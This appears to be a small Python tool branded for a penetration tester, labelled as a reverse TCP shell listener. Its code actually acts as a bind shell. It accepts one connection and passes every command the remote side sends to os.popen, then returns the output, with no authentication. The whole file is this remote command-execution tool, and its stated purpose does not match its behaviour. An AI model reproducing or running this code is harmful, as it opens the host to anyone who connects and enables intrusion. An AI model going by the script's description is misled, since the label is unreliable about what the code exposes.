import socket
import os
import sys

def validate_ip(ip):
    """Validate IP address format."""
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(part) <= 255 for part in parts)
    except ValueError:
        return False

def validate_port(port):
    """Validate port number."""
    try:
        port_num = int(port)
        return 1 <= port_num <= 65535
    except ValueError:
        return False

def start_listener(host, port):
    """Start a TCP listener for reverse shell."""
    # Create socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((host, port))
        server.listen(1)
        print(f"[*] Listening on {host}:{port}")

        # Accept connection
        client, addr = server.accept()
        print(f"[*] Connection from {addr}")

        # Simple shell
        while True:
            # Send command prompt
            client.send(b"shell> ")
            # Receive command
            cmd = client.recv(1024).decode().strip()
            if not cmd or cmd.lower() == "exit":
                break
            # Execute command and send output
            try:
                output = os.popen(cmd).read()
                client.send(output.encode())
            except Exception as e:
                client.send(f"Error: {str(e)}\n".encode())

        # Clean up
        client.close()
        server.close()
        print("[*] Connection closed")
    except Exception as e:
        print(f"[!] Listener error: {str(e)}")
        server.close()
        sys.exit(1)

def main():
    # Display ASCII art banner and info
    banner = """
    █████╗ ██╗     ██████╗  █████╗ ███╗   ██╗
   ██╔══██╗██║     ██╔══██╗██╔══██╗████╗  ██║
   ███████║██║     ██████╔╝███████║██╔██╗ ██║
   ██╔══██║██║     ██╔══██╗██╔══██║██║╚██╗██║
   ██║  ██║███████╗██████╔╝██║  ██║██║ ╚████║
   ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
   ██████╗ ███████╗██╗     ██╗   ██╗██╗     ██╗
   ██╔══██╗██╔════╝██║     ██║   ██║██║     ██║
   ██████╔╝█████╗  ██║     ██║   ██║██║     ██║
   ██╔══██╗██╔══╝  ██║     ██║   ██║██║     ██║
   ██████╔╝███████╗███████╗╚██████╔╝███████╗██║
   ╚═════╝ ╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝

   [*] Penetration Tester
   [*] Bug Bounty Hunter
   [*] Security Researcher
   [*] beluli.mk
    """
    print(banner)
    print("[*] Reverse TCP Shell Listener")
    
    # Prompt for HOST
    while True:
        host = input("[?] Enter HOST to listen on (e.g., 0.0.0.0 for all interfaces): ").strip()
        if validate_ip(host):
            break
        print("[!] Invalid IP address. Please enter a valid IPv4 address (e.g., 0.0.0.0 or 192.168.1.100).")
    
    # Prompt for PORT
    while True:
        port = input("[?] Enter PORT to listen on (e.g., 4444): ").strip()
        if validate_port(port):
            break
        print("[!] Invalid port. Please enter a number between 1 and 65535.")
    
    # Convert port to integer
    port = int(port)
    
    # Start the listener
    start_listener(host, port)

if __name__ == "__main__":
    main()
